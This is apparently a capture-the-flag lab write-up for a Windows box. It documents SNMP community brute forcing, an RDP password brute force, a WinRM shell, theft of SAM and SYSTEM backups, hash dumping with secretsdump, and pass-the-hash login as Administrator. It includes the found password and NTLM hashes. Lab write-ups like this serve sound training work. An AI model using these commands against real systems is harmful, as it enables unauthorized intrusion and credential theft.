## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.16.68
# HOSTNAME // Found Post Initial foothold
year-of-the-owl
# OS INFORMATION // Found Post Initial foothold
Windows Server 2019 Standard
# Credentials // Found Post Initial foothold
Jared:sarah 
```
## OPEN PORTS DETAILS
```bash
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)

139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127

3306/tcp  open  mysql         syn-ack ttl 127 MariaDB 10.3.24 or later (unauthorized)

3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services

5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
# ENUMERATION
## PORT 139 445
```bash
# Recon
SMB         10.10.16.68     445    YEAR-OF-THE-OWL  [*] Windows 10 / Server 2019 Build 17763 (name:YEAR-OF-THE-OWL) (domain:year-of-the-owl) (signing:False) (SMBv1:False)
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'

# Tools and commands used
sudo smbclient -L $ip
sudo nxc smb $ip
sudo nxc smb $ip --shares -u '' -p ''
sudo enum4linux -a $ip
sudo enum4linux-ng $ip

# Note
- No shares available
```
## PORT 80
```bash
# Recon
Summary   : Apache[2.4.46], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10], OpenSSL[1.1.1g], PHP[7.4.10], X-Powered-By[PHP/7.4.10]

# Fuzzing
http://10.10.16.68/examples             (Status: 503) [Size: 401]
http://10.10.16.68/index.php            (Status: 200) [Size: 252]
http://10.10.16.68/style.css            (Status: 200) [Size: 149]

# Tools and commands used
sudo whatweb -v $url
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -b 403,404 -o fuzz/gobuster-common.txt -e -t 20 -u $url/
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -b 403,404 -o fuzz/gobuster-raft-large-files.txt -e -t 20 -u $url/
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -b 403,404 -o fuzz/gobuster-raft-large-directories.txt -e -t 20 -u $url/

# Note
- No interesting files available
```
## PORT 443
```bash
# Recon
Summary   : Apache[2.4.46], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10], OpenSSL[1.1.1g], PHP[7.4.10], X-Powered-By[PHP/7.4.10]

# Fuzzing
https://10.10.16.68/examples             (Status: 503) [Size: 402]
https://10.10.16.68/index.php            (Status: 200) [Size: 252]
http://10.10.16.68/style.css            (Status: 200) [Size: 149]

# Tools and commands used
sudo whatweb -v $url
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -b 403,404 -o fuzz/gobuster-common.txt -e -t 20 -k -u $url/
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -b 403,404 -o fuzz/gobuster-raft-large-files.txt -e -t 20 -k -u $url/
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -b 403,404 -o fuzz/gobuster-raft-large-directories.txt -e -t 20 -k -u $url/

# Note
- No interesting files available
```
## PORT 3306
```bash
# Tools and commands used
mysql -h $ip -u root

ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host 'ip-10-11-127-94.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server

# Note
- Not able to connect
```
## PORT 161 162 SNMP ENUMERATION - UDP 
```bash
- Port was open|filtered 
- Since no more initial leads trying bruteforce community strings

# bruteforce community strings
sudo onesixtyone $ip -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
Scanning 1 hosts, 3218 communities
10.10.16.68 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)

- Found community string openview 
- Trying other tools

# snmpwalk
- MIB OID Value for User Accounts 1.3.6.1.4.1.77.1.2.25 
sudo snmpwalk -c openview -v1 $ip 1.3.6.1.4.1.77.1.2.25
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"

- List system contents
# snmp-check
sudo snmp-check -c openview $ip
[*] User accounts:                                                                                                                                                          Guest                                                 
Jareth                                                                                                                                                                      
Administrator                                                                                                                                                               
DefaultAccount                                                                                                                                                              
WDAGUtilityAccount    

- Found username Jareth
```
## INITIAL FOOTHOLD
```bash
# Brute force RDP port 3389 with username Jareth and Password list
sudo patator rdp_login host=$ip user='Jareth' password=FILE0 0=/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -x ignore:code=134
06:51:48 patator    INFO - code  size    time | candidate                          |   num | mesg
06:51:48 patator    INFO - -----------------------------------------------------------------------------
06:53:55 patator    INFO - 147   49     2.787 | sarah                              |   861 | exit: 0, err: ERRCONNECT_CONNECT_TRANSPORT_FAILED

- Found Credential Password: sarah
- Jareth:sarah

# Get Shell via evil-winrm as port 5985 is open 
sudo evil-winrm -i $ip -u Jareth -p sarah
*Evil-WinRM* PS C:\Users\Jareth\Documents> whoami
year-of-the-owl\jareth
```
## PRIVILEGE ESCALATION
```bash
# Found Hidden files 
*Evil-WinRM* PS C:\> dir -Hidden
d--hs-        9/18/2020   2:14 AM                $Recycle.Bin
*Evil-WinRM* PS C:\> cd '$Recycle.Bin'
*Evil-WinRM* PS C:\$Recycle.Bin> dir
*Evil-WinRM* PS C:\$Recycle.Bin> dir -Hidden
    Directory: C:\$Recycle.Bin
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        9/18/2020   7:28 PM                S-1-5-21-1987495829-1628902820-919763334-1001
d--hs-       11/13/2020  10:41 PM                S-1-5-21-1987495829-1628902820-919763334-500

*Evil-WinRM* PS C:\$Recycle.Bin> cd 'S-1-5-21-1987495829-1628902820-919763334-500'
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-500> dir
Access to the path 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-500' is denied.
At line:1 char:1                                                                              
+ dir                                        
+ ~~~                                    
    + CategoryInfo          : PermissionDenied: (C:\$Recycle.Bin...0-919763334-500:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-500> dir -Hidden                                                                                                    
Access to the path 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-500' is denied.
At line:1 char:1                                                                                                                                                                             
+ dir -Hidden                            
+ ~~~~~~~~~~~                                                                                 
    + CategoryInfo          : PermissionDenied: (C:\$Recycle.Bin...0-919763334-500:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-500> cd ..
*Evil-WinRM* PS C:\$Recycle.Bin> cd 'S-1-5-21-1987495829-1628902820-919763334-1001'
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir

    Directory: C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak

*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> copy sam.bak C:\Windows\Tasks\sam.bak
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> copy system.bak C:\Windows\Tasks\system.bak
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> cd C:\Windows\Tasks\

*Evil-WinRM* PS C:\Windows\Tasks> download sam.bak
Info: Downloading C:\Windows\Tasks\sam.bak to sam.bak
Info: Download successful!

*Evil-WinRM* PS C:\Windows\Tasks> download system.bak
Info: Downloading C:\Windows\Tasks\system.bak to system.bak
Info: Download successful!

# Dumping Creds
sudo impacket-secretsdump -sam sam.bak -system system.bak local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::

# Use the Administrator hash to Login
sudo evil-winrm -i $ip -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
year-of-the-owl\administrator
```
# ENUMERATION OUTPUTS
## NMAP - TCP 
```bash
# Nmap 7.95 scan initiated Sat Feb  8 05:51:37 2025 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 10.10.16.68
Nmap scan report for 10.10.16.68
Host is up, received syn-ack ttl 127 (0.16s latency).
Scanned at 2025-02-08 05:51:39 IST for 258s
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
|_http-title: Year of the Owl
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
| tls-alpn: 
|_  http/1.1
|_http-title: Year of the Owl
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
445/tcp   open  microsoft-ds? syn-ack ttl 127
3306/tcp  open  mysql         syn-ack ttl 127 MariaDB 10.3.24 or later (unauthorized)
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: YEAR-OF-THE-OWL
|   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
|   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
|   DNS_Domain_Name: year-of-the-owl
|   DNS_Computer_Name: year-of-the-owl
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-08T00:25:15+00:00
| ssl-cert: Subject: commonName=year-of-the-owl
| Issuer: commonName=year-of-the-owl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-02-07T00:19:26
| Not valid after:  2025-08-09T00:19:26
| MD5:   529d:b7d4:c0f1:12f7:e458:3bfa:a38f:5d4b
| SHA-1: af01:35bc:b872:6668:2a94:3a27:925f:945a:cb53:d458
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQXSfyKJW4XZ1PIFAmANACNDANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw95ZWFyLW9mLXRoZS1vd2wwHhcNMjUwMjA3MDAxOTI2WhcNMjUw
| ODA5MDAxOTI2WjAaMRgwFgYDVQQDEw95ZWFyLW9mLXRoZS1vd2wwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCtbq33saTbBkYB1BD2b7hrXPKrvbRrrGG4
| uDvOSYWCD+Mz/Zev+2SM87nO6HTLaBOnLjpvDB8ko2uWYgPu5vnESDyYTQX4WXWI
| lGqFGLXjUq5O1vRyluW9eneYH80/I5cl/sCUd6tcCTVubmIjeyCeQOIxJonI2Qts
| cgVDtwt7RlivvtDnQUnPiqGp+qCrwIEW9D76I5I0IIu2gsArvzOFvxHlYyEJVNbr
| rYVuDnFZRJg+CwyCjIwDBrM0wdYqR4rX8iNMiITVzCrUGiWliDaR+CJREy02VVrl
| M8aK2vXvyUJp1326366WVReEtnF366HShzxtwB2WAA03OHIDd4a5AgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAXZHsNbK+0HhUHWgLajpUCKv4rmYoYCBavrzJeiVsg1V6oPl3WwsN8CzU
| MvuUQeAUR3CgTIUrugxE4h6ohVKwN1Pk4HQ5VUCLxn5kbBoyMXG4CcZJZzm0Ar14
| 1+JID+CB8ZpMPszbAGhnawYFfKYZr5X4TxSSOiB0E/WXJ/6fVopsyqaBJUANpB09
| SjK2SSVO32y/y0wD3m1MzAyyX1DDilDpM79e43VjRI1bKdeh0gYO7o9tPYSmZK1G
| 9fscvN6g1BKz2V6+M2TLsRkRRXRpCiOtyitp/kX3UwkrOfKtY+8E8BSQ9shHBYDE
| 5e7As0Ca55juHl5XjMsSkCR72VJ8ug==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-02-08T00:25:55+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 54192/tcp): CLEAN (Timeout)
|   Check 2 (port 48562/tcp): CLEAN (Timeout)
|   Check 3 (port 32082/udp): CLEAN (Timeout)
|   Check 4 (port 50298/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-08T00:25:20
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb  8 05:55:57 2025 -- 1 IP address (1 host up) scanned in 260.48 seconds
```
## NMAP - UDP TOP 20 
```bash
# Nmap 7.95 scan initiated Sat Feb  8 06:14:18 2025 as: /usr/lib/nmap/nmap -sU -sV -T4 --top-ports 20 -oN nmap/scan-udp-top20 10.10.16.68
Nmap scan report for 10.10.16.68
Host is up (0.16s latency).

PORT      STATE         SERVICE      VERSION
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb  8 06:16:25 2025 -- 1 IP address (1 host up) scanned in 127.73 seconds
```

